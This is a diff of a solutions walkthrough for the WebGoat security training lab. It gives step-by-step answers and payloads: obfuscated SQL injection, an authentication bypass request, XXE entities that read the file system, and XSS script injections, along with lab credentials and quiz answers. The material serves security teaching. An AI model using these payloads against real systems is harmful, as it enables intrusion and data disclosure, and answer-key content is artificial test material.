@@ -8,6 +8,8 @@ webgoat/goatandwolf
 
 docker run -p 8080:4444 -t webgoat/webgoat-8.0
 
+------------------------------------
+
 A1:
 
 Sql injection intro:
@@ -79,52 +81,66 @@ a';/**/seselectlect/**/*/**/frfromom/**/user_system_data;--
 12.
 104.130.219.202
 
+-------------------------------------
 
 A2 
 
 Authentication Bypass:
 
 Submit without parameters, check the user ID, edit and resend and paste this.
-
 secQuestion2=&secQuestion3=&jsEnabled=1&verifyMethod=SEC_QUESTIONS&userId=12309746
 
+jWt Tokens:
+User
+1-3
 
-A3 
+Password reset:
+2. 
+Forget password
+Name@asdf
+Send mail
+Cpy password from webwolf
+Sign in here
 
-http.request.method="POST"
+4.
+Valid credentials are: admin and green, jerry and orange, tom and purple, larry and yellow
 
-Sensitive data exposure:
+5.
+City where u born
+Favorite animal
+
+6 
+Forget password 
+Name@asdf
+Send mail
+Open link in mail change the password 
+Sign in here
+
+--------------------------------------
+
+A3 Sensitive data exposure:
+
 Locate the query to start.mc in the Network tab and click on Parameters.
 Notice the parameters {"username":"CaptainJack","password":"BlackPearl"}
 
+Wireshark - http.request.method="POST"
+
+----------------------------------------
 
 A4 XML entities:
-
 4. 
 Submit a comment and Locate the query to simple in the Network tab and click on Edit    and Resend.
 Edit the body with:
 
- <?xml version="1.0"?>
-<!DOCTYPE cat [
-<!ENTITY root SYSTEM "file:///">
-]>
-<comment> <text>&root;</text></comment>
+ <?xml version="1.0"?><!DOCTYPE comment [<!ENTITY xxe SYSTEM "file:///">]><comment><text>&xxe;</text></comment>
 
 7.
 Post a comment and Locate the query to content-type in the Network tab and click on Edit and Resend.
 Edit the body with:
 
- <?xml version="1.0"?>
-<!DOCTYPE cat [
-<!ENTITY root SYSTEM "file:///">
-]>
-<comment> <text>&root;</text></comment>
+ <?xml version="1.0"?><!DOCTYPE comment [<!ENTITY xxe SYSTEM "file:///">]><comment><text>&xxe;</text></comment>
 
  and edit the header Content-Type: application/json with Content-Type: application/xml
-
-
-
-
 
 11.
 
@@ -144,19 +160,23 @@ Request body:
 <text>test&send;</text>
 </comment>
 
+-----------------------------------------
+
 A7 Cross site scripting
 
 2. Yes
 
-7.  <script>alert()</script>
+7. <script>alert()</script>
 
-10.  Locate the goatApp/View/GoatRouter.js file and open it.
+10.  
+Locate the goatApp/View/GoatRouter.js file and open it.
 Look for routes to find 'test/:param': 'testRoute'.
 The answer is start.mvc#test/
 Debugger -> thread
 
 11.
-127.0.0.1:8080/WebGoat/start.mvc#test/<script>webgoat.customjs.phoneHome();
+Copy paste correctly
+:8080/WebGoat/start.mvc#test/<script>webgoat.customjs.phoneHome();
 
 12.
 4,3,1,2,4
